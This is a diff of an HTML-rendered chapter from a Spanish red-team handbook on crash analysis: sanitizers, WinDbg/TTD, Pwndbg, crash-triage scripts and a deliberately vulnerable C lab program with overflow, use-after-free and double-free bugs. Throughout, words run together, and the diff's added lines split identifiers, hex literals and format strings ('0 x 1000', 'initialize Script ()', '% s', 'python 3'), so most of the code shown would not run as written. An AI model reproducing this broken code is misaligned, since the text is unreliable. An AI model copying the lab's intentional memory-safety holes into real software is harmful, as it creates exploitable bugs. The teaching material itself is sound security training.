@@ -276,21 +276,21 @@
             </div>
             
             <div class="section">
-                <p>Capítulo 5</p>
+                <p><a href="05-analisis-crashes.html">Capítulo 5</a></p>
 <p>Análisis de Crashes</p>
 <p>Después de encontrar vulnerabilidades potenciales mediante fuzzing o patch diffing, el siguiente</p>
 <p>paso crítico es analizar crashes para determinar si son explotables. Este capítulo cubre triage de</p>
-<p>crashes,dominiodedepuradores,sanitizersdememoriaytécnicasavanzadasdeanálisisdecausa</p>
+<p>crashes, dominiodedepuradores, sanitizersdememoriaytécnicasavanzadasdeanálisisdecausa</p>
 <p>raíz.</p>
-<p>Objetivos del Capítulo: - Configurar entornos de depuración profesionales (WinDbg, Pwndbg) -</p>
-<p>Dominarsanitizersdememoria(ASAN,UBSAN,MSAN,TSAN)-Implementarpipelinesautomatiza-</p>
-<p>dosdetriageconCASR-DesarrollarPoCsconfiablesconpwntools-Construircadenasdeexplota-</p>
+<p>Objetivos del Capítulo: - Configurar entornos de depuración profesionales (Win Dbg, Pwndbg) -</p>
+<p>Dominarsanitizersdememoria(ASAN, UBSAN, MSAN, TSAN)-Implementarpipelinesautomatiza-</p>
+<p>dosdetriagecon CASR-Desarrollar Po Csconfiablesconpwntools-Construircadenasdeexplota-</p>
 <p>cióncompletas</p>
 <ol>
   <li>1. 4. 1 Fundamentos del Análisis de Crashes</li>
 </ol>
 <p>Elanálisisdecrasheseselprocesodetransformaruncrashdescubiertoporunfuzzerenconocimien-</p>
-<p>toaccionablesobreunavulnerabilidad. Estoincluyedeterminarlacausaraíz,evaluarexplotabilidad,</p>
+<p>toaccionablesobreunavulnerabilidad. Estoincluyedeterminarlacausaraíz, evaluarexplotabilidad,</p>
 <p>ydesarrollarpruebasdeconcepto.</p>
 <ol>
   <li>1.1. 4. 1.1 Árbol de Decisión para Análisis de Crashes</li>
@@ -305,47 +305,47 @@
 <p>│Sí │</p>
 <p>┌───────────────────────────────┐ ┌────────────────┐</p>
 <p>│ ¿Código fuente disponible? │ │ rr / TTD para │</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>└───────────────────────────────┘ │ replay exacto │</p>
 <p>│ │ └────────────────┘</p>
 <p>Sí No</p>
 <p>┌───────────────────────────────┐ ┌──────────────────────────────────┐</p>
 <p>│ Recompilar con sanitizers: │ │ ¿Qué plataforma? │</p>
-<p>│ • -fsanitize=address,undefined│ └──────────────────────────────────┘</p>
-<p>│ • -g -O1 │ │ │ │</p>
-<p>│ • -fno-omit-frame-pointer │ Windows Linux Mobile</p>
+<p>│  ·  -fsanitize=address, undefined│ └──────────────────────────────────┘</p>
+<p>│  ·  -g -O1 │ │ │ │</p>
+<p>│  ·  -fno-omit-frame-pointer │ Windows Linux Mobile</p>
 <p>└───────────────────────────────┘ │ │ │</p>
 <p>│ ▼ ▼ ▼</p>
 <p>▼ ┌─────────┐ ┌──────────┐ ┌───────────┐</p>
-<p>┌───────────────────────────┐ │ WinDbg │ │ Pwndbg │ │ Tombstone │</p>
+<p>┌───────────────────────────┐ │ Win Dbg │ │ Pwndbg │ │ Tombstone │</p>
 <p>│ Ejecutar con crash input │ │ + TTD │ │ + rr │ │ + Frida │</p>
-<p>│ Capturar reporte ASAN │ │ + !exp │ │ + CASR │ │ + LLDB │</p>
+<p>│ Capturar reporte ASAN │ │ + ! exp │ │ + CASR │ │ + LLDB │</p>
 <p>└───────────────────────────┘ └─────────┘ └──────────┘ └───────────┘</p>
 <p>│ │ │ │</p>
 <p>└──────────────────┴───────────┴────────────┘</p>
 <p>┌───────────────────────────────────────────┐</p>
 <h2>│ CLASIFICACIÓN & TRIAGE │</h2>
-<p>│ • Tipo de crash (OOB, UAF, DoubleFree) │</p>
-<p>│ • Nivel de control del atacante │</p>
-<p>│ • Severidad (Exploitable/Maybe/No) │</p>
+<p>│  ·  Tipo de crash (OOB, UAF, Double Free) │</p>
+<p>│  ·  Nivel de control del atacante │</p>
+<p>│  ·  Severidad (Exploitable/Maybe/No) │</p>
 <p>└───────────────────────────────────────────┘</p>
 <p>┌───────────────────────────────────────────┐</p>
 <h2>│ ANÁLISIS DE CAUSA RAÍZ │</h2>
-<p>│ • Minimizar input (afl-tmin) │</p>
-<p>│ • Trazar ejecución (DynamoRIO, Intel PT) │</p>
-<p>│ • Buscar datos controlados por atacante │</p>
+<p>│  ·  Minimizar input (afl-tmin) │</p>
+<p>│  ·  Trazar ejecución (Dynamo RIO, Intel PT) │</p>
+<p>│  ·  Buscar datos controlados por atacante │</p>
 <p>└───────────────────────────────────────────┘</p>
 <p>┌───────────────────────────────────────────┐</p>
-<p>│ DESARROLLO DE PoC │</p>
-<p>│ • Script reproducible (Python/pwntools) │</p>
-<p>│ • Test de confiabilidad (10/10 crashes) │</p>
-<p>│ • Documentación de impacto │</p>
+<p>│ DESARROLLO DE Po C │</p>
+<p>│  ·  Script reproducible (Python/pwntools) │</p>
+<p>│  ·  Test de confiabilidad (10/10 crashes) │</p>
+<p>│  ·  Documentación de impacto │</p>
 <p>└───────────────────────────────────────────┘</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
   <li>1.2. 4. 1.2 Selección de Herramientas por Escenario</li>
 </ol>
-<p>Escenario HerramientaPrincipal Secundaria Sanitizer Flujo</p>
+<p>Escenario Herramienta Principal Secundaria Sanitizer Flujo</p>
 <p>Linux+fuente GDB+Pwndbg rr ASAN+ Recompilar</p>
 <p>UBSAN →Repro-</p>
 <p>ducir→</p>
@@ -353,102 +353,102 @@
 <p>Linuxsin GDB+Pwndbg Ghidra N/A Reversing</p>
 <p>fuente →Crash</p>
 <p>→Triage</p>
-<p>Windows+ WinDbg+TTD VisualStudio ASAN(MSVC) Símbolos</p>
+<p>Windows+ Win Dbg+TTD Visual Studio ASAN(MSVC) Símbolos</p>
 <p>fuente →TTD→</p>
 <p>Análisis</p>
-<p>Windowssin WinDbg+TTD IDA/Ghidra N/A PageHeap</p>
-<p>fuente →!exploi-</p>
+<p>Windowssin Win Dbg+TTD IDA/Ghidra N/A Page Heap</p>
+<p>fuente →! exploi-</p>
 <p>table</p>
 <p>Corpusde CASR afl-tmin ASAN Cluster→</p>
 <p>fuzzer Minimi-</p>
 <p>zar→</p>
 <p>Priorizar</p>
-<p>Crashno rr/TTD GDB/WinDbg TSAN Grabar→</p>
+<p>Crashno rr/TTD GDB/Win Dbg TSAN Grabar→</p>
 <p>determinístico Replay→</p>
 <p>Bisect</p>
-<p>KernelLinux crash+GDB drgn KASAN vmcore</p>
+<p>Kernel Linux crash+GDB drgn KASAN vmcore</p>
 <p>Símbolos</p>
 <p>Análisis</p>
-<p>Kernel WinDbgkernel DriverVerifier N/A .dmp→</p>
+<p>Kernel Win Dbgkernel Driver Verifier N/A . dmp→</p>
 <p>Windows Símbolos</p>
-<p>!analyze</p>
+<p>! analyze</p>
 <p>Rust/Go rust-gdb/Delve LLDB ASAN(nightly) Panic→</p>
 <p>Backtrace</p>
 <h2>→FFI</h2>
 <ol>
   <li>1.3. 4. 1.3 Suite de Pruebas Vulnerable</li>
 </ol>
-<p>Paralosejerciciosdeestecapítulo,usaremosunbinarioconmúltiplesvulnerabilidades:</p>
+<p>Paralosejerciciosdeestecapítulo, usaremosunbinarioconmúltiplesvulnerabilidades:</p>
 <p>// ~/crash_analysis_lab/src/vulnerable_suite. c</p>
 <p>// Compila con: gcc -g -fno-stack-protector vulnerable_suite. c -o ../vuln_no_protect</p>
 <p>// Para ASAN: gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer vulnerable_suite. c -o ../vuln_asan</p>
 <p>#include <stdio. h></p>
 <p>#include <stdlib. h></p>
 <p>#include <string. h></p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>// Test 1: Stack Buffer Overflow</p>
 <p>// Control de RIP a offset 72 bytes (64 buffer + 8 RBP guardado)</p>
-<p>void stack_overflow(char *input) {</p>
+<p>void stack_overflow (char *input) {</p>
 <p>char buffer[64];</p>
-<p>printf("[*] Copiando input a buffer de 64 bytes...\n");</p>
-<p>strcpy(buffer, input); // ¡Sin verificación de límites!</p>
-<p>printf("[*] Buffer: %s\n", buffer);</p>
+<p>printf ("[*] Copiando input a buffer de 64 bytes...\n");</p>
+<p>strcpy (buffer, input); // ¡Sin verificación de límites!</p>
+<p>printf ("[*] Buffer: % s\n", buffer);</p>
 <p>// Test 2: Heap Buffer Overflow</p>
 <p>// Corrupción de metadatos del heap</p>
-<p>void heap_overflow(char *input) {</p>
-<p>char *buf = malloc(32);</p>
-<p>printf("[*] Allocated 32 bytes at %p\n", buf);</p>
-<p>strcpy(buf, input); // Overflow del buffer de heap</p>
-<p>printf("[*] Buffer: %s\n", buf);</p>
-<p>free(buf);</p>
+<p>void heap_overflow (char *input) {</p>
+<p>char *buf = malloc (32);</p>
+<p>printf ("[*] Allocated 32 bytes at % p\n", buf);</p>
+<p>strcpy (buf, input); // Overflow del buffer de heap</p>
+<p>printf ("[*] Buffer: % s\n", buf);</p>
+<p>free (buf);</p>
 <p>// Test 3: Use-After-Free</p>
-<p>// Lectura y escritura después de free()</p>
-<p>void use_after_free(void) {</p>
-<p>char *ptr = malloc(64);</p>
-<p>strcpy(ptr, "Hello, World!");</p>
-<p>printf("[*] Allocated at %p: %s\n", ptr, ptr);</p>
-<p>free(ptr); // Liberar memoria</p>
-<p>printf("[*] Freed, now accessing...\n");</p>
-<p>printf("[*] UAF read: %s\n", ptr); // Lectura UAF</p>
+<p>// Lectura y escritura después de free ()</p>
+<p>void use_after_free (void) {</p>
+<p>char *ptr = malloc (64);</p>
+<p>strcpy (ptr, "Hello, World!");</p>
+<p>printf ("[*] Allocated at % p: % s\n", ptr, ptr);</p>
+<p>free (ptr); // Liberar memoria</p>
+<p>printf ("[*] Freed, now accessing...\n");</p>
+<p>printf ("[*] UAF read: % s\n", ptr); // Lectura UAF</p>
 <p>ptr[0] = 'X'; // Escritura UAF</p>
 <p>// Test 4: Double Free</p>
 <p>// Corrupción de estructuras del allocator</p>
-<p>void double_free(void) {</p>
-<p>char *ptr = malloc(64);</p>
-<p>printf("[*] Allocated at %p\n", ptr);</p>
-<p>free(ptr);</p>
-<p>printf("[*] First free done\n");</p>
-<p>free(ptr); // ¡Double free!</p>
+<p>void double_free (void) {</p>
+<p>char *ptr = malloc (64);</p>
+<p>printf ("[*] Allocated at % p\n", ptr);</p>
+<p>free (ptr);</p>
+<p>printf ("[*] First free done\n");</p>
+<p>free (ptr); // ¡Double free!</p>
 <p>// Test 5: NULL Pointer Dereference</p>
 <p>// Crash determinístico en NULL</p>
-<p>void null_deref(int trigger) {</p>
-<p>char *ptr = trigger ? malloc(10) : NULL;</p>
-<p>printf("[*] ptr = %p\n", ptr);</p>
+<p>void null_deref (int trigger) {</p>
+<p>char *ptr = trigger ? malloc (10) : NULL;</p>
+<p>printf ("[*] ptr = % p\n", ptr);</p>
 <p>*ptr = 'A'; // NULL deref si trigger es 0</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>void print_usage(char *prog) {</p>
-<p>printf("Usage: %s <test_num> [input]\n", prog);</p>
-<p>printf("Tests:\n");</p>
-<p>printf(" 1 <input> - Stack overflow (72 bytes a RIP)\n");</p>
-<p>printf(" 2 <input> - Heap overflow\n");</p>
-<p>printf(" 3 - Use-after-free\n");</p>
-<p>printf(" 4 - Double free\n");</p>
-<p>printf(" 5 <0|1> - NULL deref (0=crash)\n");</p>
-<p>int main(int argc, char **argv) {</p>
-<p>setbuf(stdout, NULL);</p>
-<p>setbuf(stderr, NULL);</p>
-<p>if (argc < 2) { print_usage(argv[0]); return 1; }</p>
-<p>int test = atoi(argv[1]);</p>
-<p>switch(test) {</p>
-<p>case 1: if (argc<3) return 1; stack_overflow(argv[2]); break;</p>
-<p>case 2: if (argc<3) return 1; heap_overflow(argv[2]); break;</p>
-<p>case 3: use_after_free(); break;</p>
-<p>case 4: double_free(); break;</p>
-<p>case 5: if (argc<3) return 1; null_deref(atoi(argv[2])); break;</p>
-<p>default: print_usage(argv[0]); return 1;</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>void print_usage (char *prog) {</p>
+<p>printf ("Usage: % s <test_num> [input]\n", prog);</p>
+<p>printf ("Tests:\n");</p>
+<p>printf (" 1 <input> - Stack overflow (72 bytes a RIP)\n");</p>
+<p>printf (" 2 <input> - Heap overflow\n");</p>
+<p>printf (" 3 - Use-after-free\n");</p>
+<p>printf (" 4 - Double free\n");</p>
+<p>printf (" 5 <0|1> - NULL deref (0=crash)\n");</p>
+<p>int main (int argc, char **argv) {</p>
+<p>setbuf (stdout, NULL);</p>
+<p>setbuf (stderr, NULL);</p>
+<p>if (argc < 2) { print_usage (argv[0]); return 1; }</p>
+<p>int test = atoi (argv[1]);</p>
+<p>switch (test) {</p>
+<p>case 1: if (argc<3) return 1; stack_overflow (argv[2]); break;</p>
+<p>case 2: if (argc<3) return 1; heap_overflow (argv[2]); break;</p>
+<p>case 3: use_after_free (); break;</p>
+<p>case 4: double_free (); break;</p>
+<p>case 5: if (argc<3) return 1; null_deref (atoi (argv[2])); break;</p>
+<p>default: print_usage (argv[0]); return 1;</p>
 <p>return 0;</p>
 <p>Compilación del Laboratorio:</p>
-<p>mkdir -p ~/crash_analysis_lab/{src,crashes,casrep,pocs}</p>
+<p>mkdir -p ~/crash_analysis_lab/{src, crashes, casrep, pocs}</p>
 <p>cd ~/crash_analysis_lab/src</p>
 <h1>Guardar vulnerable_suite. c y compilar variantes</h1>
 <h1>1. Sin protecciones (para explotación)</h1>
@@ -460,118 +460,118 @@
 <h1>Verificar compilaciones</h1>
 <p>ls -la ~/crash_analysis_lab/vuln_*</p>
 <h1>Test rápido</h1>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>cd ~/crash_analysis_lab</p>
-<p>./vuln_no_protect 1 $(python3 -c "print('A'*100)") # Stack overflow</p>
+<p>./vuln_no_protect 1 $(python 3 -c "print ('A'*100)") # Stack overflow</p>
 <p>./vuln_asan 3 # UAF detectado por ASAN</p>
 <p>Tablade Comportamiento de Crashes:</p>
-<p>Test SinASAN ConASAN Señal Notas</p>
-<p>1(Stack) SIGSEGV ASAN: SIGSEGV/SIGABRTControldeRIP</p>
+<p>Test Sin ASAN Con ASAN Señal Notas</p>
+<p>1(Stack) SIGSEGV ASAN: SIGSEGV/SIGABRT Controlde RIP</p>
 <p>stack-buffer-overflow</p>
-<p>2(Heap) Silencioso ASAN: SIGABRT SinASANno</p>
+<p>2(Heap) Silencioso ASAN: SIGABRT Sin ASA Nno</p>
 <p>heap-buffer-overflow crashea</p>
-<p>3(UAF) Silencioso ASAN: SIGABRT SinASANno</p>
+<p>3(UAF) Silencioso ASAN: SIGABRT Sin ASA Nno</p>
 <p>heap-use-after-free crashea</p>
-<p>4(Double) SIGABRT ASAN:double-free SIGABRT Detectadopor</p>
+<p>4(Double) SIGABRT ASAN: double-free SIGABRT Detectadopor</p>
 <p>glibc</p>
-<p>5(NULL) SIGSEGV ASAN:SEGVon SIGSEGV Crash</p>
+<p>5(NULL) SIGSEGV ASAN: SEG Von SIGSEGV Crash</p>
 <p>unknown inmediato</p>
-<p>￿ IMPORTANTE:Lostests2y3(heapoverflowyUAF)sonsilenciosossinASAN. Siem-</p>
+<p>￿ IMPORTANTE: Lostests 2 y 3(heapoverflowy UAF)sonsilenciosossin ASAN. Siem-</p>
 <p>preusarbuildsconsanitizersparatriagecompleto.</p>
 <ol>
   <li>2. 4. 2 Depuradores y Configuración</li>
-  <li>2.1. 4. 2.1 WinDbg Preview para Windows</li>
+  <li>2.1. 4. 2.1 Win Dbg Preview para Windows</li>
 </ol>
-<p>WinDbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades</p>
-<p>avanzadasdeTimeTravelDebugging.</p>
+<p>Win Dbg Preview es el depurador estándar para análisis de crashes en Windows, con capacidades</p>
+<p>avanzadasde Time Travel Debugging.</p>
 <p>Instalación y Configuración:</p>
 <h1>Instalar desde Microsoft Store o winget</h1>
-<p>winget install Microsoft. WinDbgPreview</p>
+<p>winget install Microsoft. Win Dbg Preview</p>
 <h1>Crear directorio de símbolos</h1>
 <p>mkdir C:\Symbols</p>
 <h1>Configurar symbol path persistente (variable de entorno)</h1>
-<p>[Environment]::SetEnvironmentVariable(</p>
+<p>[Environment]:: Set Environment Variable (</p>
 <h2>"NT_SYMBOL_PATH",</h2>
-<p>"SRV*C:\Symbols*https://msdl. microsoft. com/download/symbols",</p>
+<p>"SRV*C:\Symbols*<a href="https://msdl." target="_blank">https://msdl.</a> microsoft. com/download/symbols",</p>
 <p>"User"</p>
-<p>Configuración de Symbol Path en WinDbg:</p>
-<p>.sympath SRV*C:\Symbols*https://msdl. microsoft. com/download/symbols</p>
-<p>.symfix+ C:\Symbols</p>
-<p>.reload /f</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>Comandos Esenciales de WinDbg:</p>
+<p>Configuración de Symbol Path en Win Dbg:</p>
+<p>. sympath SRV*C:\Symbols*<a href="https://msdl." target="_blank">https://msdl.</a> microsoft. com/download/symbols</p>
+<p>. symfix+ C:\Symbols</p>
+<p>. reload /f</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>Comandos Esenciales de Win Dbg:</p>
 <p>Comando Propósito Ejemplo</p>
-<p>!analyze -v Análisisautomáticodecrash N/A</p>
+<p>! analyze -v Análisisautomáticodecrash N/A</p>
 <p>k/ kp/ kv Stacktrace(variosformatos) kv 20</p>
 <p>r Mostrarregistros r rax, rbx</p>
 <p>u/ ub Disassemblyadelante/atrás u rip L10</p>
 <p>d/ db/ dq Dumpdememoria dq rsp L8</p>
-<p>!heap Análisisdelheap !heap -s</p>
-<p>!address Informaciónderegióndememoria !address rsp</p>
+<p>! heap Análisisdelheap ! heap -s</p>
+<p>! address Informaciónderegióndememoria ! address rsp</p>
 <p>lm Listarmóduloscargados lm vm ntdll</p>
-<p>!peb ProcessEnvironmentBlock N/A</p>
-<p>.ecxr Cambiaracontextodeexcepción N/A</p>
+<p>! peb Process Environment Block N/A</p>
+<p>. ecxr Cambiaracontextodeexcepción N/A</p>
 <p>g Continuarejecución N/A</p>
 <p>p/ t Stepover/Stepinto N/A</p>
 <p>Time Travel Debugging (TTD):</p>
-<p>TTDpermitegrabarlaejecucióncompletadeunprocesoyreproducirlahaciaadelanteoatrás.</p>
+<p>TT Dpermitegrabarlaejecucióncompletadeunprocesoyreproducirlahaciaadelanteoatrás.</p>
 <h1>Grabar ejecución con TTD desde línea de comandos</h1>
 <p>tttracer. exe -out C:\Traces -launch target. exe crash_input. txt</p>
-<h1>O desde WinDbg Preview:</h1>
+<h1>O desde Win Dbg Preview:</h1>
 <h1>File → Start debugging → Launch executable (advanced) → ✓ Record with Time Travel</h1>
-<p>Comandos TTD en WinDbg:</p>
+<p>Comandos TTD en Win Dbg:</p>
 <p>Comando Propósito</p>
-<p>!tt 0 Iraliniciodeltrace</p>
-<p>!tt 100 Iralfinaldeltrace</p>
-<p>!tt 50 Iral50%deltrace</p>
+<p>! tt 0 Iraliniciodeltrace</p>
+<p>! tt 100 Iralfinaldeltrace</p>
+<p>! tt 50 Iral 50% deltrace</p>
 <p>g- Ejecutarhaciaatrás</p>
 <p>p- Stepback</p>
-<p>!positions Mostrarposicionesdeltrace</p>
-<p>!index Construiríndiceparabúsquedas</p>
+<p>! positions Mostrarposicionesdeltrace</p>
+<p>! index Construiríndiceparabúsquedas</p>
 <p>dx @$curses- Buscarllamadasafunciones</p>
-<p>sion. TTD. Calls("ntdll!*Heap*")</p>
-<p>dx @$cursession. TTD. Memory(address, Buscarescriturasamemoria</p>
+<p>sion. TTD. Calls ("ntdll!*Heap*")</p>
+<p>dx @$cursession. TTD. Memory (address, Buscarescriturasamemoria</p>
 <p>size, "w")</p>
-<p>Script de Clasificación Automatizada (WinDbg JavaScript):</p>
-<p>// crash_classify. js - Ejecutar con: .scriptrun crash_classify. js</p>
+<p>Script de Clasificación Automatizada (Win Dbg Java Script):</p>
+<p>// crash_classify. js - Ejecutar con: . scriptrun crash_classify. js</p>
 <p>"use strict";</p>
-<p>function initializeScript() {</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>return [new host. apiVersionSupport(1, 7)];</p>
-<p>function analyzeCurrentCrash() {</p>
+<p>function initialize Script () {</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>return [new host. api Version Support (1, 7)];</p>
+<p>function analyze Current Crash () {</p>
 <p>const ctl = host. namespace. Debugger. Utility. Control;</p>
 <p>const dbg = host. namespace. Debugger. State;</p>
 <p>// Obtener contexto de excepción</p>
-<p>ctl. ExecuteCommand(".ecxr");</p>
+<p>ctl. Execute Command (". ecxr");</p>
 <p>// Obtener registros</p>
-<p>const regs = dbg. DebuggerVariables. curthread. Registers. User;</p>
+<p>const regs = dbg. Debugger Variables. curthread. Registers. User;</p>
 <p>const rip = regs. rip;</p>
 <p>const rsp = regs. rsp;</p>
-<p>host. diagnostics. debugLog("=== Crash Classification ===\n");</p>
-<p>host. diagnostics. debugLog(`RIP: ${rip}\n`);</p>
-<p>host. diagnostics. debugLog(`RSP: ${rsp}\n`);</p>
+<p>host. diagnostics. debug Log ("=== Crash Classification ===\n");</p>
+<p>host. diagnostics. debug Log (`RIP: ${rip}\n`);</p>
+<p>host. diagnostics. debug Log (`RSP: ${rsp}\n`);</p>
 <p>// Clasificar por tipo de acceso</p>
-<p>let crashType = "UNKNOWN";</p>
+<p>let crash Type = "UNKNOWN";</p>
 <p>let severity = "UNKNOWN";</p>
 <p>// Verificar si RIP es controlable</p>
-<p>if (rip < 0x10000 || rip > 0x7fffffffffff) {</p>
-<p>crashType = "RIP_CONTROL";</p>
+<p>if (rip < 0 x 10000 || rip > 0 x 7 fffffffffff) {</p>
+<p>crash Type = "RIP_CONTROL";</p>
 <p>severity = "CRITICAL";</p>
 <p>// Verificar NULL deref</p>
-<p>else if (rip < 0x1000) {</p>
-<p>crashType = "NULL_DEREF";</p>
+<p>else if (rip < 0 x 1000) {</p>
+<p>crash Type = "NULL_DEREF";</p>
 <p>severity = "LOW";</p>
-<p>host. diagnostics. debugLog(`Type: ${crashType}\n`);</p>
-<p>host. diagnostics. debugLog(`Severity: ${severity}\n`);</p>
-<p>// Análisis de !exploitable si está disponible</p>
+<p>host. diagnostics. debug Log (`Type: ${crash Type}\n`);</p>
+<p>host. diagnostics. debug Log (`Severity: ${severity}\n`);</p>
+<p>// Análisis de ! exploitable si está disponible</p>
 <p>try {</p>
-<p>ctl. ExecuteCommand("!exploitable");</p>
-<p>} catch(e) {</p>
-<p>host. diagnostics. debugLog("(!exploitable no disponible)\n");</p>
-<p>return { crashType, severity, rip: rip. toString(16) };</p>
-<p>function invokeScript() {</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>return analyzeCurrentCrash();</p>
+<p>ctl. Execute Command ("! exploitable");</p>
+<p>} catch (e) {</p>
+<p>host. diagnostics. debug Log ("(! exploitable no disponible)\n");</p>
+<p>return { crash Type, severity, rip: rip. to String (16) };</p>
+<p>function invoke Script () {</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>return analyze Current Crash ();</p>
 <ol>
   <li>2.2. 4. 2.2 GDB + Pwndbg para Linux</li>
 </ol>
@@ -579,7 +579,7 @@
 <p>desarrollodeexploits.</p>
 <p>Instalación de Pwndbg:</p>
 <h1>Clonar e instalar</h1>
-<p>git clone https://github. com/pwndbg/pwndbg</p>
+<p>git clone <a href="https://github." target="_blank">https://github.</a> com/pwndbg/pwndbg</p>
 <p>cd pwndbg</p>
 <p>./setup. sh</p>
 <h1>Verificar instalación</h1>
@@ -590,9 +590,9 @@
 <h1>Habilitar core dumps ilimitados</h1>
 <p>ulimit -c unlimited</p>
 <h1>Configurar patrón de nombre de cores</h1>
-<p>echo "core.%e.%p.%t" | sudo tee /proc/sys/kernel/core_pattern</p>
+<p>echo "core.% e.% p.% t" | sudo tee /proc/sys/kernel/core_pattern</p>
 <h1>O usar apport para Ubuntu (centralizado)</h1>
-<p>echo "/var/crash/core.%e.%p" | sudo tee /proc/sys/kernel/core_pattern</p>
+<p>echo "/var/crash/core.% e.% p" | sudo tee /proc/sys/kernel/core_pattern</p>
 <h1>Verificar configuración</h1>
 <p>cat /proc/sys/kernel/core_pattern</p>
 <p>Comandos Esenciales de Pwndbg:</p>
@@ -603,113 +603,113 @@
 <p>telescope Dereferenciainteligentede telescope $rsp 20</p>
 <p>memoria</p>
 <p>cyclic Generar/buscarpatrones cyclic 200/ cyclic -l</p>
-<p>0x61616168</p>
+<p>0 x 61616168</p>
 <p>search Buscarenmemoria search -s "FLAG"</p>
 <p>heap Análisisdechunksdelheap heap bins</p>
 <p>vis_heap_chunks Visualizarchunks N/A</p>
-<p>got MostrarGOT N/A</p>
-<p>plt MostrarPLT N/A</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>got Mostrar GOT N/A</p>
+<p>plt Mostrar PLT N/A</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Comando Propósito Ejemplo</p>
-<p>rop BuscargadgetsROP rop --grep "pop rdi"</p>
+<p>rop Buscargadgets ROP rop --grep "pop rdi"</p>
 <p>canary Mostrarvalordelcanary N/A</p>
-<p>piebase BasedePIE N/A</p>
+<p>piebase Basede PIE N/A</p>
 <p>procinfo Informacióndelproceso N/A</p>
 <p>Uso Típicopara Análisis de Crash:</p>
 <p>cd ~/crash_analysis_lab</p>
 <h1>Cargar binario con crash input</h1>
 <p>gdb -q ./vuln_no_protect</p>
 <h1>En GDB/Pwndbg:</h1>
-<p>pwndbg> set args 1 $(python3 -c "print('A'*100)")</p>
+<p>pwndbg> set args 1 $(python 3 -c "print ('A'*100)")</p>
 <p>pwndbg> run</p>
 <h1>Después del crash:</h1>
 <p>pwndbg> context</p>
 <p>pwndbg> bt # Backtrace</p>
 <p>pwndbg> telescope $rsp 20 # Examinar stack</p>
-<p>pwndbg> x/20gx $rsp # Raw dump del stack</p>
+<p>pwndbg> x/20 gx $rsp # Raw dump del stack</p>
 <p>pwndbg> info reg # Todos los registros</p>
 <p>pwndbg> checksec # Verificar protecciones</p>
 <p>Script de Análisis Black-Box (GDB Python):</p>
-<p>#!/usr/bin/env python3</p>
+<p>#!/usr/bin/env python 3</p>
 <h1>blackbox_analyze. py - Análisis automatizado de crashes</h1>
 <h1>Uso: gdb -q -x blackbox_analyze. py ./target</h1>
 <p>import gdb</p>
 <p>import re</p>
-<p>class CrashAnalyzer:</p>
+<p>class Crash Analyzer:</p>
 <p>def __init__(self):</p>
 <p>self. crash_info = {}</p>
-<p>def analyze(self):</p>
+<p>def analyze (self):</p>
 <h1>Ejecutar hasta crash</h1>
-<p>gdb. execute("run", to_string=True)</p>
+<p>gdb. execute ("run", to_string=True)</p>
 <h1>Capturar estado</h1>
-<p>self. crash_info['signal'] = self. _get_signal()</p>
-<p>self. crash_info['rip'] = self. _get_reg('rip')</p>
-<p>self. crash_info['rsp'] = self. _get_reg('rsp')</p>
-<p>self. crash_info['backtrace'] = self. _get_backtrace()</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>self. crash_info['signal'] = self. _get_signal ()</p>
+<p>self. crash_info['rip'] = self. _get_reg ('rip')</p>
+<p>self. crash_info['rsp'] = self. _get_reg ('rsp')</p>
+<p>self. crash_info['backtrace'] = self. _get_backtrace ()</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>Clasificar</h1>
-<p>self. _classify()</p>
-<p>self. _print_report()</p>
-<p>def _get_signal(self):</p>
+<p>self. _classify ()</p>
+<p>self. _print_report ()</p>
+<p>def _get_signal (self):</p>
 <p>try:</p>
-<p>output = gdb. execute("info signal", to_string=True)</p>
-<p>for line in output. split('\n'):</p>
-<p>if 'received' in line. lower():</p>
-<p>return line. strip()</p>
+<p>output = gdb. execute ("info signal", to_string=True)</p>
+<p>for line in output. split ('\n'):</p>
+<p>if 'received' in line. lower ():</p>
+<p>return line. strip ()</p>
 <p>except:</p>
 <p>pass</p>
 <p>return "UNKNOWN"</p>
-<p>def _get_reg(self, reg):</p>
+<p>def _get_reg (self, reg):</p>
 <p>try:</p>
-<p>return int(gdb. parse_and_eval(f"${reg}"))</p>
+<p>return int (gdb. parse_and_eval (f"${reg}"))</p>
 <p>except:</p>
 <p>return 0</p>
-<p>def _get_backtrace(self):</p>
+<p>def _get_backtrace (self):</p>
 <p>try:</p>
-<p>return gdb. execute("bt 10", to_string=True)</p>
+<p>return gdb. execute ("bt 10", to_string=True)</p>
 <p>except:</p>
 <p>return "No backtrace available"</p>
-<p>def _classify(self):</p>
+<p>def _classify (self):</p>
 <p>rip = self. crash_info['rip']</p>
-<p>if rip < 0x1000:</p>
+<p>if rip < 0 x 1000:</p>
 <p>self. crash_info['type'] = "NULL_POINTER_DEREF"</p>
 <p>self. crash_info['severity'] = "LOW"</p>
-<p>elif rip > 0x7fffffffffff:</p>
+<p>elif rip > 0 x 7 fffffffffff:</p>
